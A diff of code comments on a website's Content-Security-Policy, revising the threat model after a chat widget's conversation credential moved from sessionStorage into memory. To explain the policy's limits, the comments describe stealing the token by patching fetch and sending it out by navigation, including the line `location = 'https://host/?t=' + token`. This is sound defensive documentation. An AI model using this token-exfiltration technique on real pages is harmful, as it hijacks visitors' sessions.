@@ -1,11 +1,23 @@
 // ---------------------------------------------------------------------------
 // Content-Security-Policy
 //
-// The conversation credential the NEXUS widget uses lives in sessionStorage,
-// where it has to be: the widget reads it, and sessionStorage is the only store
-// that is scoped to one tab. That makes it readable by any script the page
-// executes, so the compensating control is a policy that stops a third-party
-// script from getting onto the page at all. Until now there was no
+// CORRECTED 2026-09-25. These comments used to say the conversation credential
+// the NEXUS widget uses lives in `sessionStorage`. It no longer does, and had
+// not by the time this file was last read: the widget holds it in a closure
+// (`const readConv = () => conversation` in public/index.html), which an
+// independent reviewer confirmed in a live browser — nothing in sessionStorage,
+// localStorage, cookies, window.name, IndexedDB, the Cache API, the DOM or any
+// global. The credential is MEMORY-ONLY and dies with the document.
+//
+// That changes the threat model this policy answers, and it does not retire it.
+// A script that executes ON THE PAGE, in the same document, can still read a
+// closure variable indirectly — by patching `fetch` and reading the header the
+// widget sends, or by driving the widget's own UI — so an injected third-party
+// tag is still the exposure, and a policy that stops one from getting onto the
+// page at all is still the compensating control. What the memory-only credential
+// DID remove is the cross-page reach: a script on another same-origin page can
+// no longer find a previous conversation's credential in storage after the
+// visitor navigates. Until this file gained a CSP there was no
 // Content-Security-Policy anywhere in this repository.
 //
 // This is defence in depth. It does not replace server-side revocation and
@@ -32,10 +44,12 @@
 // So inline code is permitted, and what the policy still buys has to be stated
 // accurately rather than generously. It buys one thing: no script may be LOADED
 // from another origin, which is the realistic path for an injected third-party
-// tag. It does NOT prevent exfiltration of the sessionStorage token. With
-// 'unsafe-inline', an injection that arrives as markup executes, reads the
-// token, and leaves by top-level navigation - `location = 'https://host/?t=' +
-// token`, a window.open, an <a> the script clicks. No enforceable directive
+// tag. It does NOT prevent exfiltration of the conversation token. With
+// 'unsafe-inline', an injection that arrives as markup executes in the same
+// document as the widget, reaches the token (memory-only is not out of reach
+// from inside the page: patching `fetch` reads the header the widget sends), and
+// leaves by top-level navigation - `location = 'https://host/?t=' + token`, a
+// window.open, an <a> the script clicks. No enforceable directive
 // governs that: `navigate-to` was specified and never shipped, form-action
 // covers only form submissions, and connect-src covers only the programmatic
 // channels (fetch, XMLHttpRequest, WebSocket, EventSource, sendBeacon). So
@@ -59,7 +73,7 @@ const HOMEPAGE_CSP = [
   // The only form is the NEXUS composer, which submits through fetch to this origin.
   "form-action 'self'",
   // The chat proxy at /api/nexus/chat is same-origin, so a script that runs here
-  // cannot fetch, XHR, WebSocket, EventSource or sendBeacon the sessionStorage
+  // cannot fetch, XHR, WebSocket, EventSource or sendBeacon the conversation
   // token to another host. It can still carry it out by navigating - see the
   // note above; this directive governs programmatic requests only.
   "connect-src 'self'",
@@ -132,11 +146,15 @@ const LEGACY_PAGE_CSP = [
 // itself links to.
 //
 // This tier exists because an enumerated list of paths was never coverage. The
-// conversation credential lives in sessionStorage, which is scoped to the ORIGIN
-// and the tab, not to a page: it survives a same-tab navigation, so a visitor who
-// chats and then clicks "Privacy" inside the panel carries a live token onto that
-// page, and an injection there could read it. Any page on this origin can read
-// the token, so every page needs the policy.
+// original reason was that the credential lived in `sessionStorage`, which is
+// scoped to the ORIGIN and the tab rather than to a page, so it survived a
+// same-tab navigation and a visitor who chatted and then clicked "Privacy"
+// inside the panel carried a live token onto that page. That specific reach is
+// GONE: the credential is memory-only and does not survive the navigation. The
+// coverage is still right, for reasons that did not change - every page on this
+// origin can reach /api/nexus/* as the visitor, the panel links out to pages in
+// this tier, and several of them still load unpinned third-party scripts, so an
+// injection there is the realistic supply-chain path onto this origin.
 //
 // The allowlist is the measured union of what those pages actually load, scanned
 // from their markup and from the local scripts they pull in - the same method the
